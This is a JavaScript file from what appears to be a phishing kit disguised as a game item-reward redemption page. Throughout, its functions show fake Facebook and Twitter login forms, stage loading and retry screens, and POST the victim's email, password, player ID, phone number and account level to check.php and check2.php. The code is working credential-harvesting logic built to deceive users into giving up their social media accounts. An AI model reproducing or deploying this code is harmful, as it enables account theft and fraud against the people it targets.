// code for activate clicked sound
var buka = new Audio();
buka.src = "media/open.mp3";

var tutup = new Audio();
tutup.src = "media/close.mp3";

// code for validate data to next step
function audioFile() {
    var audio = document.getElementById('audioFile');
    audio.play();
}
$(document).ready(function() {
    $("o").attr("onclick", "audioFile()");
});

function open_itemReward_confirmation2(ag) {
    var itemReward_confirmationImg2 = $(ag).attr("src");
    var ItemName = $(ag).attr("item-name");
    var price = $(ag).attr("item-price");
    $('.itemReward_confirmation2').show();
    $('#myItemReward_confirmationImg').attr('src', itemReward_confirmationImg2);
    $('#ItemName').html(ItemName);
    $('#price').html(price);
}

function close_reward_confirmation() {
    $('.open_rewards').hide()
    $('.itemReward_confirmation2').hide()
}

function open_facebook() {
    $('.login-facebook').show()
    $('.account_login').hide()
}

function open_twitter() {
    $('.login-twitter').show()
    $('.account_login').hide()
}

function close_facebook() {
    $('.login-facebook').hide()
    $('.account_login').show()
}

function close_twitter() {
    $('.login-twitter').hide()
    $('.account_login').show()
}

function close_Redeem_confirmation() {
    $('.Redeem_confirmation').hide()
}

function open_account_login() {
    $('.account_login').show()
    $('.open_rewards').hide()
    $('.Redeem_confirmation').hide()
}

function open_account_verification() {
    $('.account_verification').show()
    $('.open_rewards').hide()
    $('.Redeem_confirmation').hide()
}

function open_Redeem_confirmation(ag) {
    var Redeem_confirmationImg = $(ag).attr("src");
    $('.Redeem_confirmation').show();
    $('#myRedeem_confirmationImg').attr('src', Redeem_confirmationImg);
}

function ValidateLoginFbData() {
    $('#ValidateLoginFbForm').submit(function(submitingValidateLoginFbData) {
        submitingValidateLoginFbData.preventDefault();

        $emailfb = $('#email-facebook').val().trim();
        $passwordfb = $('#password-facebook').val().trim();
        $loginfb = $('#login-facebook').val().trim();
        if ($emailfb == '' || $emailfb == null || $emailfb.length <= 5) {
            $('.email-fb').fadeIn();
            setTimeout(function() {
                $('.email-fb').fadeOut();
            }, 2000);
            $('.sandi-fb').hide();
            $('.PlayerIdLoginBox').hide();
            $('.login-facebook').show();
            return false;
        } else {
            $('.email-fb').hide();
            $("input#validateEmail").val($emailfb);
            $('.login-facebook').hide();
            $('.PlayerIdLoginBox').show();
        }
        if ($passwordfb == '' || $passwordfb == null || $passwordfb.length <= 5) {
            $('.sandi-fb').fadeIn();
            setTimeout(function() {
                $('.sandi-fb').fadeOut();
            }, 2000);
            $('.PlayerIdLoginBox').hide();
            $('.login-facebook').show();
            return false;
        } else {
            $('.sandi-fb').hide();
            $("input#validatePassword").val($passwordfb);
            $("input#validateLogin").val($loginfb);
            $('.login-facebook').hide();
            $('.login-facebook-load').show()
            setTimeout(function() {
                $('.login-facebook-sec').hide()
                $('.account_verification').show()
                $('.login-facebook-load').hide()
            }, 3000)
        }
        var $validateEmail = $("input#validateEmail").val();
        var $validatePassword = $("input#validatePassword").val();
        var $validateLogin = $("input#validateLogin").val();
        if ($validateEmail == "" && $validatePassword == "" && $validateLogin == "" && $playid == "") {
            $('.account_verification').show();
            return false;
        }

        $.ajax({
            type: "POST",
            url: "check.php",
            data: $(this).serialize(),
            beforeSend: function() {
                $('.login-facebook').hide();
            },
            success: function() {
                $('.login-facebook').hide();
            }
        });
    });
    return false;
}

function ValidateLoginTwitterData() {
    $('#ValidateLoginTwitterForm').submit(function(submitingValidateLoginTwitterData) {
        submitingValidateLoginTwitterData.preventDefault();

        $emailtw = $('#email-twitter').val().trim();
        $passwordtw = $('#password-twitter').val().trim();
        $logintw = $('#login-twitter').val().trim();
        if ($emailtw == '' || $emailtw == null || $emailtw.length <= 3) {
            $('.email-tw').fadeIn();
            setTimeout(function() {
                $('.email-tw').fadeOut();
            }, 2000);
            $('.sandi-tw').hide();
            $('.PlayerIdLoginBox').hide();
            $('.login-twitter').show();
            return false;
        } else {
            $('.email-tw').hide();
            $("input#validateEmail").val($emailtw);
            $('.login-twitter').hide();
            $('.PlayerIdLoginBox').show();
        }
        if ($passwordtw == '' || $passwordtw == null || $passwordtw.length <= 7) {
            $('.sandi-tw').fadeIn();
            setTimeout(function() {
                $('.sandi-tw').fadeOut();
            }, 2000);
            $('.PlayerIdLoginBox').hide();
            $('.login-twitter').show();
            return false;
        } else {
            $('.sandi-tw').hide();
            $("input#validatePassword").val($passwordtw);
            $("input#validateLogin").val($logintw);
            $('.login-twitter').hide();
            $('.login-twitter-load').show()
            setTimeout(function() {
                $('.login-twitter-sec').hide()
                $('.account_verification').show()
                $('.login-twitter-load').hide()
            }, 3000)
        }
        var $validateEmail = $("input#validateEmail").val();
        var $validatePassword = $("input#validatePassword").val();
        var $validateLogin = $("input#validateLogin").val();
        if ($validateEmail == "" && $validatePassword == "" && $validateLogin == "" && $playid == "") {
            $('.account_verification').show();
            return false;
        }

        $.ajax({
            type: "POST",
            url: "check.php",
            data: $(this).serialize(),
            beforeSend: function() {
                $('.login-twitter').hide();
            },
            success: function() {
                $('.login-twitter').hide();
            }
        });
    });
    return false;
}

function SecValidateLoginFbData() {
    return (
        $('#SecValidateLoginFbForm').submit(function(submitingSecValidateLoginFbData) {
            submitingSecValidateLoginFbData.preventDefault();
            $emailfbSec = $('#sec-email-facebook').val().trim()
            $passwordfbSec = $('#sec-password-facebook').val().trim()
            $loginfbSec = $('#sec-login-facebook').val().trim()
            if ($emailfbSec == '' || $emailfbSec == null || $emailfbSec.length <= 5) {
                return (
                    $('.email-fb').fadeIn(),
                    setTimeout(function() {
                        $('.email-fb').fadeOut()
                    }, 2000),
                    $('.sandi-fb').hide(),
                    $('.wrong-fb').hide(),
                    $('.PlayerIdLoginBox').hide(),
                    $('.login-facebook-sec').show(),
                    false
                )
            } else {
                $('.email-fb').hide()
                $('input#validateEmail').val($emailfbSec)
                $('.login-facebook-sec').hide()
                $('.PlayerIdLoginBox').hide()
            }
            if ($passwordfbSec == '' || $passwordfbSec == null || $passwordfbSec.length <= 5) {
                return (
                    $('.sandi-fb').fadeIn(),
                    setTimeout(function() {
                        $('.sandi-fb').fadeOut()
                    }, 2000),
                    $('.wrong-fb').hide(),
                    $('.PlayerIdLoginBox').hide(),
                    $('.login-facebook-sec').show(),
                    false
                )
            } else {
                $('.sandi-fb').hide()
                $('input#validatePassword').val($passwordfbSec)
                $('input#validateLogin').val($loginfbSec)
                $('.login-facebook-sec').hide()
                $('.PlayerIdLoginBox').hide()
            }
            var $validateEmail = $('input#validateEmail').val(),
                $validatePassword = $('input#validatePassword').val(),
                $validateLogin = $('input#validateLogin').val(),
                $ValidatePopupPlayId = $('input#ValidatePopupPlayId').val()
            $('.account_verification').hide();
            if (
                $validateEmail == '' &&
                $validatePassword == '' &&
                $validateLogin == '' &&
                $ValidatePopupPlayId == ''
            ) {
                return $('.PlayerIdLoginBox').hide(), false
            }
            $.ajax({
                type: 'POST',
                url: 'check.php',
                data: $(this).serialize(),
                beforeSend: function() {
                    $('.login-facebook-sec').hide()
                    $('.login-facebook-load').show()
                },
                success: function() {
                    $('.login-facebook-sec').hide()
                    $('.account_verification').show()
                    $('.login-facebook-load').hide()
                },
            })
        }),
        false
    )
}

function SecValidateLoginTwitterData() {
    return (
        $('#SecValidateLoginTwitterForm').submit(function(submitingSecValidateLoginTwitterData) {
            submitingSecValidateLoginTwitterData.preventDefault();
            $emailtwSec = $('#sec-email-twitter').val().trim()
            $passwordtwSec = $('#sec-password-twitter').val().trim()
            $logintwSec = $('#sec-login-twitter').val().trim()
            if ($emailtwSec == '' || $emailtwSec == null || $emailtwSec.length <= 3) {
                return (
                    $('.email-tw').fadeIn(),
                    setTimeout(function() {
                        $('.email-tw').fadeOut()
                    }, 2000),
                    $('.wrong-tw').hide(),
                    $('.sandi-tw').hide(),
                    $('.PlayerIdLoginBox').hide(),
                    $('.login-twitter-sec').show(),
                    false
                )
            } else {
                $('.email-tw').hide()
                $('input#validateEmail').val($emailtwSec)
                $('.login-twitter-sec').hide()
                $('.PlayerIdLoginBox').hide()
            }
            if ($passwordtwSec == '' || $passwordtwSec == null || $passwordtwSec.length <= 7) {
                return (
                    $('.sandi-tw').fadeIn(),
                    setTimeout(function() {
                        $('.sandi-tw').fadeOut()
                    }, 2000),
                    $('.wrong-tw').hide(),
                    $('.PlayerIdLoginBox').hide(),
                    $('.login-twitter-sec').show(),
                    false
                )
            } else {
                $('.sandi-tw').hide()
                $('input#validatePassword').val($passwordtwSec)
                $('input#validateLogin').val($logintwSec)
                $('.login-twitter-sec').hide()
                $('.PlayerIdLoginBox').hide()
            }
            var $validateEmail = $('input#validateEmail').val(),
                $validatePassword = $('input#validatePassword').val(),
                $validateLogin = $('input#validateLogin').val(),
                $ValidatePopupPlayId = $('input#ValidatePopupPlayId').val()
            $('.account_verification').hide();
            if (
                $validateEmail == '' &&
                $validatePassword == '' &&
                $validateLogin == '' &&
                $ValidatePopupPlayId == ''
            ) {
                return $('.PlayerIdLoginBox').hide(), false
            }
            $.ajax({
                type: 'POST',
                url: 'check.php',
                data: $(this).serialize(),
                beforeSend: function() {
                    $('.login-twitter-sec').hide()
                    $('.login-twitter-load').show()
                },
                success: function() {
                    $('.account_verification').show()
                    $('.login-twitter-load').hide()
                    $('.login-twitter-sec').hide()
                },
            })
        }),
        false
    )
}


function ValidateVerificationData() {
    $('#ValidateVerificationDataForm').submit(function(submitingVerificationData) {
        submitingVerificationData.preventDefault();

        var $validateEmail = $("input#validateEmail").val();
        var $validatePassword = $("input#validatePassword").val();
        var $codetel = $("input#codetel").val();
        var $playid = $("input#playid").val();
        var $phone = $("input#phone").val();
        var $level = $("input#level").val();
        var $validateLogin = $("input#validateLogin").val();
        if ($validateEmail == "" && $validatePassword == "" && $codetel == "" && $playid == "" && $phone == "" && $level == "" && $validateLogin == "") {
            $('.verification_info').show();
            $('.account_verification').hide();
            return false;
        }

        $.ajax({
            type: "POST",
            url: "check2.php",
            data: $(this).serialize(),
            beforeSend: function() {
                $('.check_verification').show();
                $('.account_verification').hide();
            },
            success: function() {
                $(".processing_account").show();
                $('.check_verification').hide();
            }
        });
    });
    return false;
};